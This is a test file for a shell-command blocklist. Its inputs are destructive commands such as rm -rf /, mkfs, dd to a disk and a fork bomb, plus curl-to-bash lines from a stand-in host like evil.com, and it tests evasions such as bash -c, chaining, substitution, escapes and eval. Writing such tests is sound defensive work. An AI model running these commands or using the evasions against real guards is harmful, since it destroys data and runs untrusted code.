import { describe, it, expect } from 'vitest';
import { checkBlocklist, normalizeCommand } from './blocklist.js';

describe('blocklist', () => {
  describe('original patterns still trigger', () => {
    it('rm -rf /', () => {
      expect(checkBlocklist('rm -rf /').blocked).toBe(true);
    });

    it('rm -f /', () => {
      expect(checkBlocklist('rm -f /').blocked).toBe(true);
    });

    it('mkfs.ext4', () => {
      expect(checkBlocklist('mkfs.ext4 /dev/sda1').blocked).toBe(true);
    });

    it('dd of=/dev/', () => {
      expect(checkBlocklist('dd if=/dev/zero of=/dev/sda').blocked).toBe(true);
    });

    it('fork bomb', () => {
      expect(checkBlocklist(':() { :|:& } ; :').blocked).toBe(true);
    });

    it('chmod 777 /', () => {
      expect(checkBlocklist('chmod -R 777 /').blocked).toBe(true);
    });

    it('curl pipe bash', () => {
      expect(checkBlocklist('curl http://evil.com/x.sh | bash').blocked).toBe(true);
    });

    it('wget pipe bash', () => {
      expect(checkBlocklist('wget -O- http://x.com/s | bash').blocked).toBe(true);
    });
  });

  describe('bypass vectors are now caught', () => {
    it('full path: /bin/rm -rf /', () => {
      expect(checkBlocklist('/bin/rm -rf /').blocked).toBe(true);
    });

    it('/usr/bin/rm -rf /', () => {
      expect(checkBlocklist('/usr/bin/rm -rf /').blocked).toBe(true);
    });

    it('bash -c "rm -rf /"', () => {
      expect(checkBlocklist('bash -c "rm -rf /"').blocked).toBe(true);
    });

    it("sh -c 'rm -rf /'", () => {
      expect(checkBlocklist("sh -c 'rm -rf /'").blocked).toBe(true);
    });

    it('env bash -c "rm -rf /"', () => {
      expect(checkBlocklist('env bash -c "rm -rf /"').blocked).toBe(true);
    });

    it('chained: ls; rm -rf /', () => {
      expect(checkBlocklist('ls; rm -rf /').blocked).toBe(true);
    });

    it('piped after dangerous: echo x && rm -rf /', () => {
      expect(checkBlocklist('echo x && rm -rf /').blocked).toBe(true);
    });

    it('command substitution: echo $(rm -rf /)', () => {
      expect(checkBlocklist('echo $(rm -rf /)').blocked).toBe(true);
    });

    it('backtick substitution: echo `rm -rf /`', () => {
      expect(checkBlocklist('echo `rm -rf /`').blocked).toBe(true);
    });

    it('backslash escape: r\\m -rf /', () => {
      expect(checkBlocklist('r\\m -rf /').blocked).toBe(true);
    });

    it('sudo rm -rf /', () => {
      expect(checkBlocklist('sudo rm -rf /').blocked).toBe(true);
    });

    it('eval "rm -rf /"', () => {
      expect(checkBlocklist('eval "rm -rf /"').blocked).toBe(true);
    });

    it('shred file', () => {
      expect(checkBlocklist('shred /dev/sda').blocked).toBe(true);
    });

    it('wipefs', () => {
      expect(checkBlocklist('wipefs -a /dev/sda').blocked).toBe(true);
    });

    it('sudo curl pipe bash', () => {
      expect(checkBlocklist('curl http://x.com/y | sudo bash').blocked).toBe(true);
    });
  });

  describe('safe commands are NOT blocked', () => {
    it('ls', () => {
      expect(checkBlocklist('ls').blocked).toBe(false);
    });

    it('echo hello', () => {
      expect(checkBlocklist('echo hello').blocked).toBe(false);
    });

    it('cat file.txt', () => {
      expect(checkBlocklist('cat file.txt').blocked).toBe(false);
    });

    it('git status', () => {
      expect(checkBlocklist('git status').blocked).toBe(false);
    });

    it('npm install', () => {
      expect(checkBlocklist('npm install').blocked).toBe(false);
    });

    it('rm specific file (not root)', () => {
      expect(checkBlocklist('rm -f /tmp/test.txt').blocked).toBe(false);
    });

    it('rm -rf project/dir (not root)', () => {
      expect(checkBlocklist('rm -rf ./build').blocked).toBe(false);
    });

    it('curl without pipe', () => {
      expect(checkBlocklist('curl http://example.com').blocked).toBe(false);
    });

    it('chmod on specific file', () => {
      expect(checkBlocklist('chmod 644 file.txt').blocked).toBe(false);
    });

    it('dd to regular file', () => {
      expect(checkBlocklist('dd if=input.img of=output.img').blocked).toBe(false);
    });
  });

  describe('normalizeCommand', () => {
    it('splits on semicolons', () => {
      const frags = normalizeCommand('ls; echo hi');
      expect(frags).toContain('ls');
      expect(frags).toContain('echo hi');
    });

    it('unwraps bash -c', () => {
      const frags = normalizeCommand('bash -c "echo test"');
      expect(frags).toContain('echo test');
    });

    it('extracts $() substitutions', () => {
      const frags = normalizeCommand('echo $(whoami)');
      expect(frags).toContain('whoami');
    });

    it('strips path prefixes', () => {
      const frags = normalizeCommand('/usr/bin/rm -rf /');
      expect(frags.some(f => f.includes('rm -rf /'))).toBe(true);
    });
  });
});
